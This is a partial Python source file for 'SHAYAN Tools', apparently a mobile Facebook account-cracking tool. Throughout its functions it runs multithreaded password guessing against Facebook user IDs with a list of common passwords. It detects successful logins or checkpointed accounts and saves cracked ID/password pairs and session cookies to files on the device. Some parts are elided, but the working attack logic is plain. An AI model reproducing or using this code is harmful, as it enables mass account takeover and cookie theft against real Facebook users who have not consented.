...
os.system('clear')
print('\n\033[1;37m Loading SHAYAN Tools...')
try:
...
def xi():
    global km
    j=getKey()
    r=requests.get("https://raw.githubusercontent.com/shayano007/sk/main/approl.txt").text
    if j in r:
        pass
    else:
        os.system("clear")
...
|  $$$$$$/| $$ \  $$
 \______/ |__/  \__/    XD
\x1b[1;97m ---------------------------------------------
\x1b[1;97m [\x1b[1;91m•\x1b[1;97m] \x1b[1;97m Owner   :  SHAYAN X SALMAN
\x1b[1;97m [\x1b[1;91m•\x1b[1;97m] \x1b[1;97m Facebook:  SHAYAN KHAN
\x1b[1;97m [\x1b[1;91m•\x1b[1;97m] \x1b[1;97m Status  :  FREE
\x1b[1;97m [\x1b[1;91m•\x1b[1;97m] \x1b[1;97m Tool    :  NEW
\x1b[1;97m [\x1b[1;91m•\x1b[1;97m] \x1b[1;97m Version : \x1b[1;92m0.7
\x1b[1;97m ----------------------------------------------
\x1b[1;97m TIME PASS KARTA HU BAS OR KUCH NAHI
\033[1;37m==================================================== """  )
...
def main__manu():
        try:
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                clear()
                                print('\x1b[1;97mHELP KARI EK DOSRI KI ! ')
                                print('\x1b[1;97m! ')
                                linex()
                                ...
                                print('\033[1;97m[•]\033[1;32m COOKIES SAVED IN \033[1;31m: \033[1;32m/sdcard/SHAYAN-COOKIE.txt') 
                                print('\033[1;97m[•]\033[1;32m OK ACCOUNTS SAVED IN \033[1;31m: \033[1;32m/sdcard/SHAYAN-OK.txt')
                                linex()
                                ...
                                os.system('xdg-open https://www.facebook.com/SHaYaNoHaRaMi007');menu()
                        elif xd in ['4','04']:
                        	     os.system('xdg-open https://www.facebook.com/SHaYaNoHaRaMi007');menu()
                        elif xd in ['0','00']:
                                clear()
                                ...
                                os.system('xdg-open  https://www.facebook.com/SHaYaNoHaRaMi007');print('\x1b[1;97m[•] \x1b[1;92mPROGRAM CLOSED THANKS FOR USE SHAYAN TOOL');time.sleep(2);linex();exit() 
                        else:
...
def pak():
                ...
                with tred(max_workers=30) as SHAYAN:     
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khan123','khan12345','baloch123','baloch786','i love you','khankhan','baloch','khattak','khattak123','ali123','ali786','SHAYAN123']
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m[SHAYAN-M1]  %s|OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in SHAYAN:
                                ...
                                print(f'\r\r\x1b[1;92m[SHAYAN-OK] %s | %s'%(ids,pas))
                                ...
                                if 'y' in pcp:
                                        print('\r\r\x1b[1;93m[SHAYAN-CP]  '+ids+' | '+pas+'\033[1;97m')
...
def api4(self,uid,first,last):
        global loop,oks,cps
        sys.stdout.write('\\\33[1;37m [SHAYAN-M4] %s|OK/%s CP/%s\33[1;37m'%(loop,len(oks),len(cps)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in SHAYAN:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\\\33[1;32m [SHAYAN-OK] %s | %s'%(ids,pas))
                                open('/sdcard/SHAYAN-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in SHAYAN:
...
def api(ids,names,passlist):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [SHAYAN] %s | M2 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				...
				if "session_key" in q:
					...
					cookie = f"sb={sb};{coki}"
					p('\r\033[1;92m[SHAYAN-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/SHAYAN_M1_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/SHAYAN_M1_COOKIES.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[SHAYAN-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/SHAYAN_M1_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
...
def api1(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [SHAYAN-KING-M3] %s|OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m[LEGEN-SHAYAN-OK]  '+ids+' | '+pas+ ' '+joined(ids)+' ')
                                        open('/sdcard/SHAYAN-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\033[1;91m [SHAYAN-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/SHAYAN-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
...
def rndm(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [SHAYAN-RANDOM] %s|OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                                ...
                                if 'session_key' in q:
                                        ...
                                        try:
                                                ...
                                                if uid in okk:pass
                                                        ...
                                                        print('\r\r\033[1;32m [SHAYAN-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/SHAYAN-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [SHAYAN-OK] '+uid+' | '+pas+'\033[1;97m')
